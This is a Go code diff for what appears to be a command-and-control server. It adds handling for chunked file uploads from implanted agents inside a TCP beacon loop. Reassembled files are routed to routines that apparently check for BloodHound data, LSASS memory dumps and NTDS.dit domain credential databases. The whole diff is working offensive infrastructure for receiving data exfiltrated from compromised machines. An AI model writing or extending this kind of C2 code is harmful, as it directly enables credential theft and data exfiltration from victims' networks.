@@ -17,6 +17,15 @@ import (
 // tcpFrame reads/writes length-prefixed frames: [4 bytes LE length][payload]
 const tcpMaxFrame = 32 * 1024 * 1024
 
+// tcpChunkState tracks an in-progress chunked file upload from a single agent connection.
+type tcpChunkState struct {
+	filename    string
+	totalChunks int
+	received    int
+	tempPath    string
+	file        *os.File
+}
+
 func tcpWriteFrame(conn net.Conn, data []byte) error {
 	if len(data) == 0 || len(data) > tcpMaxFrame {
 		return fmt.Errorf("invalid frame size %d", len(data))
@@ -141,6 +150,15 @@ func (s *Server) StartTCPListener(ctx context.Context, port int) error {
 
 func (s *Server) handleTCPAgent(conn net.Conn) {
 	defer conn.Close()
+	activeChunks := make(map[string]*tcpChunkState)
+	defer func() {
+		for _, cs := range activeChunks {
+			if cs.file != nil {
+				cs.file.Close()
+			}
+			os.Remove(cs.tempPath)
+		}
+	}()
 	remote := conn.RemoteAddr().String()
 	ip := remote
 	if host, _, splitErr := net.SplitHostPort(ip); splitErr == nil {
@@ -417,6 +435,105 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 			go s.CheckAndPromptNTDS(agentID, filename)
 			if err := tcpWriteAck(conn, true, ""); err != nil {
 				disconnectReason = fmt.Sprintf("write upload ACK: %v", err)
+				break beaconLoop
+			}
+
+		case "upload_chunk":
+			plain, err := tcpOpenPayload(msg, key)
+			if err != nil {
+				s.printf("[!] TCP agent %s: invalid upload_chunk: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write chunk error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			var creq struct {
+				TaskID      int64  `json:"task_id"`
+				Filename    string `json:"filename"`
+				FileID      string `json:"file_id"`
+				ChunkIndex  int    `json:"chunk_index"`
+				TotalChunks int    `json:"total_chunks"`
+				Data        string `json:"data"`
+			}
+			if err := json.Unmarshal(plain, &creq); err != nil || creq.FileID == "" || creq.TotalChunks < 1 {
+				s.printf("[!] TCP agent %s: invalid upload_chunk JSON\n", agentID[:8])
+				if ackErr := tcpWriteAck(conn, false, "invalid chunk"); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write chunk JSON error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			chunkData, err := base64.StdEncoding.DecodeString(creq.Data)
+			if err != nil {
+				s.printf("[!] TCP agent %s: upload_chunk bad data: %v\n", agentID[:8], err)
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write chunk data error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
+			if err := os.MkdirAll(dir, 0700); err != nil {
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write chunk mkdir error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			cs, exists := activeChunks[creq.FileID]
+			if !exists {
+				tempPath := filepath.Join(dir, creq.FileID+".tmp")
+				f, err := os.OpenFile(tempPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
+				if err != nil {
+					if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+						disconnectReason = fmt.Sprintf("write chunk open error: %v", ackErr)
+						break beaconLoop
+					}
+					continue
+				}
+				cs = &tcpChunkState{
+					filename:    filepath.Base(creq.Filename),
+					totalChunks: creq.TotalChunks,
+					tempPath:    tempPath,
+					file:        f,
+				}
+				activeChunks[creq.FileID] = cs
+			}
+			if _, err := cs.file.Write(chunkData); err != nil {
+				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
+					disconnectReason = fmt.Sprintf("write chunk write error: %v", ackErr)
+					break beaconLoop
+				}
+				continue
+			}
+			cs.received++
+			if cs.received == cs.totalChunks {
+				cs.file.Close()
+				cs.file = nil
+				finalPath := filepath.Join(dir, cs.filename)
+				if renameErr := os.Rename(cs.tempPath, finalPath); renameErr != nil {
+					if ackErr := tcpWriteAck(conn, false, renameErr.Error()); ackErr != nil {
+						disconnectReason = fmt.Sprintf("write chunk rename error: %v", ackErr)
+						break beaconLoop
+					}
+					delete(activeChunks, creq.FileID)
+					continue
+				}
+				info, _ := os.Stat(finalPath)
+				var fileSize int64
+				if info != nil {
+					fileSize = info.Size()
+				}
+				s.printf("[%s] tcp upload: %s (%d bytes, %d chunks)\n", agentID[:8], cs.filename, fileSize, cs.totalChunks)
+				fileData, _ := os.ReadFile(finalPath)
+				go s.CheckAndPromptBH(agentID, cs.filename, fileData)
+				go s.CheckAndPromptLSASS(agentID, cs.filename)
+				go s.CheckAndPromptNTDS(agentID, cs.filename)
+				delete(activeChunks, creq.FileID)
+			}
+			if err := tcpWriteAck(conn, true, ""); err != nil {
+				disconnectReason = fmt.Sprintf("write chunk ACK: %v", err)
 				break beaconLoop
 			}
 
